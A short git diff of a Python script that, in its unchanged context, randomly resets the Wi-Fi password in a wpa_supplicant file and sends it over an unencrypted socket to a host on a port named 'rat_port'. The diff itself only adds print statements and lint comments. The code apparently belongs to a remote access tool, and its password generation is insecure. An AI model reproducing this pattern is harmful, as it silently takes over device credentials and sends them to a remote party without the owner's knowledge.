@@ -8,14 +8,14 @@ from constants import *
 
 
 def generate_password():
-	new_password = ''
+	new_password = '' # noqa
 	for x in range(PASSWORD_LENGTH):
 		new_password += choice(printable)
 	print(new_password)
 	return new_password
 
 
-def edit_config(new_password):
+def edit_config(new_password): # noqa
 	with open(wpa_supplicant) as f:
 		lines = f.readlines()
 		for i, line in enumerate(lines):
@@ -37,6 +37,8 @@ edit_config(new_password)
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # noqa
 
+print("[*] Waiting for the client...")
+
 while True:
 	try:
 		s.connect((host, rat_port))
@@ -44,6 +46,7 @@ while True:
 	except socket.error:
 		sleep(0.1)
 
+print(f"[*] Connection is established successfully")
 s.send(new_password.encode())
 
 s.close()
